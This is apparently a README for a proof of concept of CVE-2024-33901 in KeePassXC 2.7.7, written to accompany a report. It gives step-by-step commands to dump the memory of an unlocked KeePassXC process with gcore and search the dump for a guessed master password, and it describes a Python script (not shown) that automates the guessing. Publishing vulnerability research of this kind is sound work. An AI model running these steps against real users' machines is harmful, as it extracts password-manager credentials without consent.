# CVE-2024-33901-ProofOfConcept

## This code is the one referenced under the KeePassXC section in the report

Short program that demonstrates the vulnerability CVE-2024-33901 in KeePassXC version 2.7.7

## How to replicate the vulnerability
1. Open KeePassXC and authenticate the database
2. While the database is authenticated, create a memory dump file for it

  This can be achieved by getting the PID, which can be done with this command:
  
    ps aux | grep keepassxc
  
  And then running this command: sudo gcore -o keepassxc_dump PID_HERE
  
  For example, if the PID that you got was 1234, then the command would have to be:
  
    sudo gcore -o keepassxc_dump 1234
  
3. Finally, you can run this command: cat keepassxc_dump.PID_HERE | strings | grep "password guess here"

  So if the PID was 1234, the command would be:

     cat keepassxc_dump.1234 | strings | grep "password guess here"

Once the memory dump file is created, the attack can be performed even if the database is locked again or if KeePassXC is closed.

The provided Python code performs all of these steps, and it attempts multiple password guesses based on the text files provided.
